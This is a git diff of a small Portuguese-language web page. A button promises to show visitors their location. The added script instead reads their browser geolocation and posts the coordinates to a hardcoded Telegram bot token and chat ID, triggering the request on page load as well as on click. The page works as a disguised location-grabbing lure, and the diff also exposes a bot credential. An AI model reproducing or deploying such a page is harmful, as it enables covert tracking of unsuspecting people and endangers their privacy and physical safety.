@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
@@ -78,6 +78,78 @@
             }
             });
         }
+        console.log(loc())
+    </script>
+</body>
+</html>  -->
+
+
+
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        body {
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        button {
+            text-align: center;
+            margin: auto;
+            width: 300px;
+            height: 50px;
+            border-radius: 30px;
+            background-color: gray;
+        }
+    </style>
+</head>
+<body>
+    <button onclick="getLocation()">
+        CLICK PARA SABER SUA LOCALIZAÇÃO
+    </button>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocationToTelegram);
+            } else {
+                console.log('Geolocalização não suportada no navegador.');
+            }
+        }
+
+        function sendLocationToTelegram(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // Insira aqui o seu token do bot do Telegram
+            const token = '6070765539:AAF4MvOmCigHqy-kCq7m5jdxTA0ydtl9dHY';
+
+            // Insira aqui o chat ID onde deseja enviar a mensagem
+            const chatId = '-968435308';
+
+            // Monta a mensagem com as coordenadas de latitude e longitude
+            const message = `Latitude: ${latitude}\nLongitude: ${longitude}`;
+
+            // Envia a mensagem para o Telegram
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('text', message);
+
+            fetch(url, { method: 'POST', body: formData })
+                .then(response => {
+                    console.log('Mensagem enviada para o Telegram com sucesso!');
+                })
+                .catch(error => {
+                    console.log('Erro ao enviar a mensagem para o Telegram:', error);
+                });
+        }
+        console.log(getLocation())
     </script>
 </body>
 </html>
